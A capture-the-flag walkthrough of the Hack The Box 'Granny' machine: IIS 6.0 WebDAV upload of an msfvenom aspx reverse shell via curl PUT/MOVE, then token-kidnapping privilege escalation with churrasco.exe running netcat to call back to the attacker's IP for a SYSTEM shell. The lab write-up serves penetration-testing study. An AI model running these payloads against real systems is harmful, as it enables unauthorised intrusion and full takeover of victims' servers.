# Granny

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Granny)  [2](https://app.hackthebox.com/machines/Granny)

**Machine ip:** 10.10.10.15

![Granny](https://github.com/h4md153v63n/CTFs/assets/5091265/69e37688-dfcb-49cc-810a-ec81fec1581b)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.15 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.15 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec0f4480-c9e2-4ca0-a2e8-0d68e25572cc)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/212f7ec1-e525-4478-9288-149a9f5e5ec4)


## Enumeration
Visit **http://10.10.10.15**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6c195f8b-51e0-4e25-bb23-ac0b0deee900)

Directory fuzzing, and there's nothing useful here:

`gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.15/ -k -n -r -t 50`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a16434ff-a8b8-4fa4-98b3-ada15e1356a3)

The server is a IIS httpd 6.0 server, and it's using **WebDAV** extension:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0c3e5ae0-216e-4315-a416-81bac7972e2d)

Check the allowed HTTP methods: `davtest --url http://10.10.10.15`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ed156ba0-61f4-4c6b-b74a-0d1eb796979b)

**Alternatively**, try to use **cadaver** [1](https://hackmd.io/@Mecanico/HyvmSscrc) [2](https://ivanitlearning.wordpress.com/2020/07/27/hackthebox-granny-grandpa/).


## Exploitation & Gaining Access

### Method 1: WebDav Vulnerability [1](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability) [2](https://vk9-sec.com/exploiting-webdav/)
Generate a reverse shell with msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > shell.aspx

mv shell.aspx shell.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03d4a892-0847-4152-9540-70b82ce26b5f)

**Alternative shells:**
+ `/usr/share/webshells/aspx/cmdasp.aspx`
+ https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE method:

```
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt

curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt' 
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b2ef3cc0-7d3c-41b9-aa22-768d296ff1a6)

```
# Start netcat listener:
nc -nvlp 4444

# Trigger the revershell using curl, or opening on the browser:
curl http://10.10.10.15/shell.aspx
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3a072777-cb2a-4d6d-b136-0577b7f52fb0)

We got the shell, and there's no privilege to read user.txt flag.


### Method 2: [CVE-2017-7269](https://www.exploit-db.com/exploits/41738)
Check the solution [1](https://nimanthadeshappriya.medium.com/hack-the-box-granny-writeup-without-metasploit-864848ffffff) [2](https://bros10.github.io/posts/Granny/)

Exploit poc links [1](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) [2](https://github.com/c0d3cr4f73r/CVE-2017-7269)


### Method 3: [CVE-2017-7269](https://www.exploit-db.com/exploits/41992) -> Metasploit Solution
Check the solution [1](https://ethicalhacs.com/granny-hackthebox-walkthrough/) 


## Privilege Escalation

### Method 1: JuicyPotato & MS09-012 & MS15-051 [1](https://github.com/Re4son/Churrasco) / CVE:N/A [2](https://www.exploit-db.com/exploits/6705) -> token kidnapping
Run `systeminfo` command:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6515a046-7ff5-44d9-97c0-9474442fb379)

```
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/20c25173-1276-4990-ad97-70c861e7ff03)

```
whoami /priv

whoami /all
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/69daf92b-1996-4360-9f47-996fa82ecd7b)

We accomplish the prerequisites for **JuicyPotato** but knowing that the version of the server is older that the normal support for the JuicyPotato exploit we are gonna use a different version called churrasco.exe that we can use on **Server 2003** and **Windows XP**. 

+ Here's a complete guide of how to use it click **here**: https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
+ Check the solutions [1](https://hackmd.io/@Mecanico/HyvmSscrc) [2](https://dm7500.github.io/oscp-prep/2020-01-31-HTB-Granny/#privilege-escalation)
+ Check for more details [1](https://github.com/h4md153v63n/CTFs/blob/main/01_HTB/45_Granny.md#juicy-potato---rotten-potato) 

Run Windows Exploit Suggester:

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-15-mssb.xls --systeminfo systeminfo.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/287d5c3d-4949-47e9-a841-b029af5fe2f0)

There are many exploits for privilege escalation here, but for now try **MS15-051**: [Microsoft Windows Server 2003 — Token Kidnapping Local Privilege Escalation](https://www.exploit-db.com/exploits/6705).

**Alternatively**, check the links [**1-MS09-012**](https://bros10.github.io/posts/Granny/) [**2-MS09-012**](https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e).

Download exploit [1](https://github.com/Re4son/Churrasco), and transfer to the target victim, then prepare netcat listener, and run it:

```
# On the kali attack vm:
smbserver.py desktop /home/kali/Desktop

smbserver.py win /usr/share/windows-binaries/

nc -lnvp 5555

# On the target machine:
cd c:\inetpub\wwwroot

copy \\10.10.14.24\desktop\churrasco.exe

copy \\10.10.14.24\win\nc.exe

churrasco.exe

churrasco.exe -d "C:\Inetpub\wwwroot\nc.exe 10.10.14.24 5555 -e cmd.exe"
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/748c1463-7a7d-4396-a32a-a380802dd68b)

Get the shell as **nt authority\system**, and read both user.txt flag and root.txt flag:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/86116b29-e1bd-41bd-b658-be751f8e5c84)

**Alternatively**, check the [metasploit solution](https://steflan-security.com/hack-the-box-granny-walkthrough/).


### Method 2: MS14-058 -> Metasploit Solution
Check the solution [1](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit#id-317c) [2](https://0xdf.gitlab.io/2019/03/06/htb-granny.html#ms14-058)

Metasploit module [1](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/)


### Method 3: MS14-070 / CVE-2014-1767 -> With/Without Metasploit
Check the solutions [1-metasploit](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-granny/) [2](https://vostdev.wordpress.com/2021/02/15/htb-grandpa-granny-walk-through/)

Without metasploit [1](https://vostdev.wordpress.com/2021/02/15/htb-grandpa-granny-walk-through/).

Metasploit module [1](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl/)


### Method 4: ms10_015 -> Metasploit Solution
Check the solution [1](https://ethicalhacs.com/granny-hackthebox-walkthrough/)

**Alternatively**, check the different solutions [1](https://www.hackingarticles.in/hack-the-box-challenge-granny-walkthrough/)


# References & Alternatives
+ https://vvmlist.github.io/#Granny
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/granny-writeup-w-o-and-w-metasploit
+ https://0xdf.gitlab.io/2019/03/06/htb-granny.html
+ https://nimanthadeshappriya.medium.com/hack-the-box-granny-writeup-without-metasploit-864848ffffff
+ https://medium.com/@toneemarqus/granny-htb-manual-walkthrough-2023-tonee-183fb453e15b
+ https://ethicalhacs.com/granny-hackthebox-walkthrough/
+ https://benheater.com/hackthebox-granny/
+ https://steflan-security.com/hack-the-box-granny-walkthrough/)
+ https://bros10.github.io/posts/Granny/
+ https://hackmd.io/@Mecanico/HyvmSscrc
  + https://www.jeroenvansaane.com/posts/htb/granny/
+ https://korbinian-spielvogel.de/posts/granny-writeup/
+ https://ivanitlearning.wordpress.com/2020/07/27/hackthebox-granny-grandpa/
+ https://www.hackingarticles.in/hack-the-box-challenge-granny-walkthrough/


## CVE Scripting
+ **MS15-051 / MS09-012:**
  + https://www.exploit-db.com/exploits/6705
  + https://www.rapid7.com/db/modules/exploit/windows/local/ms15_051_client_copy_image/
  + https://github.com/Re4son/Churrasco
    + https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
    + https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
  + /usr/share/sqlninja/apps/churrasco.exe
  + https://medium.com/@nmappn/windows-privelege-escalation-via-token-kidnapping-6195edd2660e
  + https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
  + https://github.com/Re4son/Churrasco/blob/master/DEFCON-18-Cerrudo-Token-Kidnapping-Revenge.pdf
+ **CVE-2017-7269:**
  + https://www.exploit-db.com/exploits/41738
  + https://www.exploit-db.com/exploits/41992
    + https://nvd.nist.gov/vuln/detail/CVE-2017-7269
    + https://www.cvedetails.com/cve/CVE-2017-7269/
    + https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/
  + https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
  + https://github.com/c0d3cr4f73r/CVE-2017-7269
+ **MS14-058:**
  + https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/
+ **MS14-070 / CVE-2014-1767:**
  + https://www.exploit-db.com/exploits/39525
  + https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl/


## Tools
+ **davtest:**
  + https://www.kali.org/tools/davtest/
  + https://cirt.net/DAVTest
  + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
+ **nmap - Script http-webdav-scan:** https://nmap.org/nsedoc/scripts/http-webdav-scan.html
+ **Windows Exploit Suggester:**
  + https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ **local exploit suggester:** https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester/
+ **.aspx** shells:
  + msfvenom 
  + `/usr/share/webshells/aspx/cmdasp.aspx`
  + https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+ **cadaver:**
  + https://www.kali.org/tools/cadaver/
  + https://notroj.github.io/cadaver/


## Technical Knowledge
+ **WebDav Vulnerability:**
  + https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
  + https://vk9-sec.com/exploiting-webdav/


## Problems Solution
+ 


## Juicy Potato - Rotten Potato
+ https://juggernaut-sec.com/seimpersonateprivilege/
+ https://github.com/ivanitlearning/Juicy-Potato-x86
	+ https://github.com/ivanitlearning/Juicy-Potato-x86/releases
	+ https://github.com/ohpe/juicy-potato/releases
	+ https://github.com/ohpe/juicy-potato/
+ **CLSID:**
	+ https://ohpe.it/juicy-potato/CLSID/
	+ https://github.com/ohpe/juicy-potato/tree/master/CLSID
+ https://hunter2.gitbook.io/darthsidious/privilege-escalation/juicy-potato
	+ https://ohpe.it/juicy-potato/
	+ https://ivanitlearning.wordpress.com/2019/07/20/potato-privilege-escalation-exploits-for-windows/
	+ https://rizemon.github.io/posts/devel-htb/
	+ https://yogeshwarram-g.gitbook.io/hackthebox/windows/devil#privilege-escalation


## For More
+ https://en.wikipedia.org/wiki/WebDAV
+ https://kb.synology.com/en-my/DSM/help/WebDAVServer/webdav_server
+ https://www.ibm.com/docs/en/cognos-analytics/11.1.0?topic=services-configuring-webdav-iis
+ https://en.wikipedia.org/wiki/Return-oriented_programming
+ https://asfiyashaikh.medium.com/windows-privilege-escalation-using-sudo-su-ae5573feccd9
+ https://linux.die.net/man/1/cadaver

